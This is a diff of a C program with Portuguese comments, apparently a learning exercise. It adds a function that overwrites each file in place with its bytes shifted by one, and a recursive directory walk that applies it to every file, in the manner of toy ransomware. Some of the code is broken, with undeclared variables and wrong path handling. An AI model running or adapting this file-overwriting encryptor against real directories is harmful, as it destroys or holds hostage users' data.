@@ -1,6 +1,6 @@
 #include <stdio.h>
 #include <stdlib.h>
-#include <dirent.h> //Biblioteca que da acesso a diretorios do sistema
+#include <dirent.h> 
 #include <string.h> //5 - Biblioteca para manipular strings
 
 void usarDepois(){
@@ -37,29 +37,59 @@ void usarDepois(){
     fclose(fout2);
 }
 
-void buscaArquivos(char *raiz){ //4 - defino um ponteiro para deixar o diretório flexível
-    //1- ACESSANDO UM DIRETÓRIO E O CONTEÚDO DELE//
-    DIR  *d; //1 - Comando que acessa as bibliotecas do sistema
-    struct dirent *dir; //1 - defino um ponteiro que aponta para a estrutura dirent?
-    //estrutura que vai pegar uma pasta do diretorio
+//7 - Função para a cifra recebe um ponteiro para o caminho do arquivo
+void cifrar(char *path){
+    int i;
+    printf("Cifrando arquivo: %s\n", path);
 
-    d = opendir(raiz); //1 - determino que o ponteiro pega o diretorio em que o codigo esta rodando. 4 - Determino a pasta arquivos pq quero que pegue apenas ela (para teste): "./arquivos"
-    dir = readdir(d); //1 - pega a primeira pasta e determina o ponteiro para ela e tambem o primeiro elemento do diretorio
+    // LEITURA ARQUIVO //
+    FILE *fin = fopen(path, "rb"); //7 - Só mudo o arquivo que passo para pegar o que pega lá no pega quando percorre as pastas
+    fseek(fin, 0, SEEK_END);
+    long len = ftell(fin); 
+    rewind(fin);
 
-    while (dir != NULL){
-        if (dir->d_type == 0){ //4 - para listar apenas arquivo
-            printf("%s\n", dir->d_name); //1 - imprime o diretorio que esta pegando
-        }else if(dir->d_name[0] != '.'){ //4 - para não pegar a pasta raiz
-            //char caminho[1024]; //5 - variável que vai pegar o tamanho do caminho de um diretório ou arquivo?
-            char caminho[strlen(raiz) + dir->d_namlen + 1]; //6 - Para pegar o tamanho dinamicamente pego o tamanho da string do nome da pasta e somo com o tamanho do comprimento mais o /0
-            snprintf(caminho, sizeof(caminho), "%s/%s", raiz, dir->name); //5 - função que envia uma mensagem(?) para algum endereço de memória que eu especificar. Primeiro determino o caminho para o qual vou passar a mensagem, o tamanho do buffer (é o tamanho máximo de caracteres que posso escrever) - pode chamar a variável ou pegar com sizeof(caminho) e o que será escrito
-            // printf("Pasta: %s\n", dir->d_name); //4 - para exibir os diretórios também
-            printf("Caminho da pasta: %s\n", dir->d_name); //5 -  Agora imprime o caminho da pasta ao invés de apenas o nome dela
-        }
-        dir = readdir(d); //1 - roda de novo porque senao so pega o primeiro 
+    void *buffer = malloc(len); 
+    fread(buffer, len, 1, fin); 
+
+    fclose(fin);
+
+    // CRIPTOGRAFIA DO ARQUIVO //
+    for (i = 0; i < len; i++){ 
+        *(char*)(buffer + i) += 1;
     }
 
-    closedir(d); //1 - fecha o diretorio
+    FILE *fout = fopen(path, "wb"); //7 - Passo o 'path' para sobrescrever o arquivo a fim de criptografá-lo
+    fwrite(buffer, len, 1, fout);
+    fclose(fout);
+}
+
+void buscaArquivos(char *raiz){ 
+    DIR  *d; 
+    struct dirent *dir; 
+
+    d = opendir(raiz);
+    dir = readdir(d);
+
+    while (dir != NULL){
+        if (dir->d_type == 0){
+            printf("%s\n", dir->d_name); 
+            
+            char caminho[strlen(raiz) + dir->d_namlen]; 
+            snprintf(path, sizeof(path), "%s/%s", raiz + 2, dir->name); 
+            
+            cifrar(dir->d_name); 
+        }else if(dir->d_name[0] != '.'){ 
+            //char caminho[1024]; //5 - variável que vai pegar o tamanho do caminho de um diretório ou arquivo?
+            char caminho[strlen(raiz) + dir->d_namlen + 2];
+            snprintf(caminho, sizeof(caminho), "%s/%s", raiz, dir->name); 
+            // printf("Pasta: %s\n", dir->d_name); //4 - para exibir os diretórios também
+            printf("Caminho da pasta: %s\n", dir->d_name); 
+            buscaArquivos(caminho); 
+        }
+        dir = readdir(d); 
+    }
+
+    closedir(d); 
 }
 
 int main(){
@@ -70,4 +100,4 @@ int main(){
     return 0;
 }
 
-//ÁRVORE DE ARQUIVOS -> FALTAM 02:13
+
